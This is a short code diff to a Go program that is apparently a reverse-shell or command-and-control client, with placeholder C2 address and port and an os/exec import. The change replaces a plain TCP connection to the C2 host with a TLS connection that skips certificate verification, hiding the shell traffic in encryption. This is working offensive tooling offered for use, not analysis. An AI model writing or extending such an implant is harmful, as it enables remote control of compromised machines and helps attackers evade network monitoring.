@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"fmt"
 	"net"
 	"os/exec"
@@ -9,10 +10,13 @@ import (
 )
 
 func main() {
-	c2Host := "192.168.0.17" // Change This
-	c2Port := "443"          // Change This
+	c2Host := "192.168.0.4" // Change This
+	c2Port := "443"         // Change This
 	address := net.JoinHostPort(c2Host, c2Port)
-	conn, err := net.Dial("tcp", address)
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+	conn, err := tls.Dial("tcp", address, conf)
 	if err != nil {
 		fmt.Println("[-] Failed to connect to C2:", err)
 		return
